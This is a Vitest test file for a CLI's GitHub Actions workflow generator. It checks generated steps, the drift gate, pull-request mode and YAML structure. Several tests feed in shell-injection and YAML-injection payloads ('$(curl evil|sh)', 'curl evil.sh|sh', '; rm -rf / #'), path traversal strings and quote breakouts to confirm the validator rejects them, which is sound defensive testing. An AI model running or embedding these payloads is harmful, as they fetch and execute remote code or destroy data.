import { describe, it, expect } from 'vitest';
import { parse as parseYaml } from 'yaml';
import { buildWorkflowYaml } from '../../src/commands/ci.js';

describe('ci init: buildWorkflowYaml', () => {
  it('generates a sync workflow for OpenAPI + http + name', () => {
    const y = buildWorkflowYaml({
      spec: 'api/openapi.yaml',
      output: './server',
      source: 'openapi',
      transport: 'http',
      name: 'my-api',
      version: 'latest',
    });

    // Triggers: spec change (push + PR) and manual.
    expect(y).toContain('name: mcpmake');
    expect(y).toMatch(/on:\n {2}push:\n {4}paths:/);
    expect(y).toContain('  pull_request:');
    expect(y).toContain('  workflow_dispatch:');
    expect(y).toContain('- "api/openapi.yaml"');

    // Regeneration step with all flags.
    expect(y).toContain('npx --yes mcpmake@latest from openapi "api/openapi.yaml"');
    expect(y).toContain('-o "./server"');
    expect(y).toContain('-n "my-api"');
    expect(y).toContain('-t http');
    expect(y).toContain('-f');

    // Verify (OpenAPI) + drift gate.
    expect(y).toContain('verify "api/openapi.yaml" -p "./server"');
    // `--` terminates git options so a `-`-leading output can never be read as a flag.
    expect(y).toContain('git status --porcelain -- "./server"');
    expect(y).toContain('exit 1');
  });

  it('omits the verify step and transport flag for non-openapi / stdio', () => {
    const y = buildWorkflowYaml({
      spec: 'recording.har',
      output: './s',
      source: 'har',
      transport: 'stdio',
      version: '0.1.0',
    });

    // Exact generate line proves no name flag and no -t http (stdio default).
    expect(y).toContain('run: npx --yes mcpmake@0.1.0 from har "recording.har" -o "./s" -f');
    expect(y).not.toContain('verify "'); // verify is OpenAPI-only
    // Drift gate still present for any source.
    expect(y).toContain('git status --porcelain -- "./s"');
  });

  it('rejects shell-injection payloads in inputs', () => {
    const base = {
      spec: 'api.yaml',
      output: './server',
      source: 'openapi' as const,
      transport: 'stdio' as const,
      version: 'latest',
    };
    expect(() => buildWorkflowYaml({ ...base, spec: '$(curl evil|sh)' })).toThrow(/Unsafe/);
    expect(() => buildWorkflowYaml({ ...base, output: '`reboot`' })).toThrow(/Unsafe/);
    expect(() => buildWorkflowYaml({ ...base, version: '; rm -rf / #' })).toThrow(/Unsafe/);
    expect(() => buildWorkflowYaml({ ...base, name: 'a"; evil; "' })).toThrow(/Unsafe/);
  });

  it('rejects a leading-dash output so the drift gate can never fail open', () => {
    const base = {
      spec: 'api.yaml',
      output: './server',
      source: 'openapi' as const,
      transport: 'stdio' as const,
      version: 'latest',
    };
    // `output: '--all'` would emit `git status --porcelain "--all"` — git reads `--all`
    // as an (unknown) option, exits non-zero with empty stdout, and `[ -n "" ]` passes:
    // the gate silently reports "no drift". Reject the value up front.
    for (const bad of ['--all', '-o', '-rf']) {
      expect(() => buildWorkflowYaml({ ...base, output: bad })).toThrow(/Unsafe/);
      expect(() => buildWorkflowYaml({ ...base, spec: bad })).toThrow(/Unsafe/);
      expect(() => buildWorkflowYaml({ ...base, version: bad })).toThrow(/Unsafe/);
    }
  });

  it('rejects an invalid source when the builder is called directly (injection guard)', () => {
    const base = {
      spec: 'api.yaml',
      output: './server',
      transport: 'stdio' as const,
      version: 'latest',
    };
    // The CLI wrapper validates SOURCES, but the exported builder must guard too: a raw
    // `source` is interpolated into the generated `from <source>` run-step.
    const injected = 'openapi "x"\n      - name: pwned\n        run: curl evil.sh|sh';
    expect(() => buildWorkflowYaml({ ...base, source: injected as unknown as 'openapi' })).toThrow(
      /Unsafe source/,
    );
    expect(() => buildWorkflowYaml({ ...base, source: 'graphql' as unknown as 'openapi' })).toThrow(
      /Unsafe source/,
    );
  });

  it('rejects path-traversal in the spec/output paths (`..` segment or absolute)', () => {
    const base = {
      spec: 'api.yaml',
      output: './server',
      source: 'openapi' as const,
      transport: 'stdio' as const,
      version: 'latest',
    };
    // The SAFE_PATH charset permits `.` and `/`, so a `..` traversal would slip
    // through without the explicit segment guard. Every escaping form throws.
    for (const bad of ['../../etc/x', '..', '../x', 'a/../b', 'a/..', './ok/../bad', '/etc/x']) {
      expect(() => buildWorkflowYaml({ ...base, spec: bad })).toThrow(/Unsafe/);
      expect(() => buildWorkflowYaml({ ...base, output: bad })).toThrow(/Unsafe/);
    }
    // Legit relative paths (incl. a filename that merely contains two dots) pass.
    for (const ok of ['api-spec.yaml', 'specs/api.yaml', './mcp-server', 'my..spec.yaml']) {
      expect(() => buildWorkflowYaml({ ...base, spec: ok, output: ok })).not.toThrow();
    }
  });

  describe('--pr (maintenance PR) mode', () => {
    const base = {
      spec: 'api.yaml',
      output: './server',
      source: 'openapi' as const,
      transport: 'stdio' as const,
      version: 'latest',
    };

    it('emits write permissions + the create-pull-request step, and DROPS the fail gate', () => {
      const y = buildWorkflowYaml({ ...base, openPr: true });

      // Write scopes are granted (needed to push the branch + open the PR).
      expect(y).toMatch(/permissions:\n {6}contents: write\n {6}pull-requests: write/);
      // The PR action with the default branch + scoped add-paths.
      expect(y).toContain('uses: peter-evans/create-pull-request@v6');
      expect(y).toContain("branch: 'mcpmake/regenerate'");
      expect(y).toContain('add-paths: "./server"');
      // The drift gate (fail/exit 1) is replaced, not appended.
      expect(y).not.toContain('exit 1');
      expect(y).not.toContain('git status --porcelain');
    });

    it('honors a custom --pr-branch', () => {
      const y = buildWorkflowYaml({ ...base, openPr: true, prBranch: 'bot/sync-server' });
      expect(y).toContain("branch: 'bot/sync-server'");
    });

    it('default (no --pr) mode emits NO permissions and NO PR action', () => {
      const y = buildWorkflowYaml(base);
      expect(y).not.toContain('permissions:');
      expect(y).not.toContain('create-pull-request');
      // ...and keeps the drift gate.
      expect(y).toContain('exit 1');
    });

    it('rejects an unsafe --pr-branch (injection, traversal, leading dash, single-quote breakout)', () => {
      // The branch goes raw into a single-quoted YAML scalar `branch: '<x>'`; a single
      // quote is the one breakout char that guard depends on, so it must be rejected.
      for (const bad of ['$(evil)', '../escape', '/abs', '-flag', 'a"; evil; "', "a'; evil; '"]) {
        expect(() => buildWorkflowYaml({ ...base, openPr: true, prBranch: bad })).toThrow(/Unsafe/);
      }
    });

    it('does not validate --pr-branch when --pr is off (branch is unused)', () => {
      expect(() =>
        buildWorkflowYaml({ ...base, openPr: false, prBranch: '$(evil)' }),
      ).not.toThrow();
    });

    it('emits structurally valid YAML with the right job shape in BOTH modes', () => {
      // Drift-gate mode: no job-level permissions, no PR step.
      const gate = parseYaml(buildWorkflowYaml(base)) as Record<string, any>;
      expect(gate.name).toBe('mcpmake');
      expect(gate.jobs.sync['runs-on']).toBe('ubuntu-latest');
      expect(gate.jobs.sync.permissions).toBeUndefined();
      const gateUses = gate.jobs.sync.steps.map((s: any) => s.uses).filter(Boolean);
      expect(gateUses).not.toContain('peter-evans/create-pull-request@v6');

      // PR mode: job-scoped write permissions + the PR step present.
      const pr = parseYaml(buildWorkflowYaml({ ...base, openPr: true })) as Record<string, any>;
      expect(pr.jobs.sync.permissions).toEqual({
        contents: 'write',
        'pull-requests': 'write',
      });
      const prStep = pr.jobs.sync.steps.find(
        (s: any) => s.uses === 'peter-evans/create-pull-request@v6',
      );
      expect(prStep).toBeDefined();
      expect(prStep.with.branch).toBe('mcpmake/regenerate');
      expect(prStep.with['add-paths']).toBe('./server');
    });
  });
});
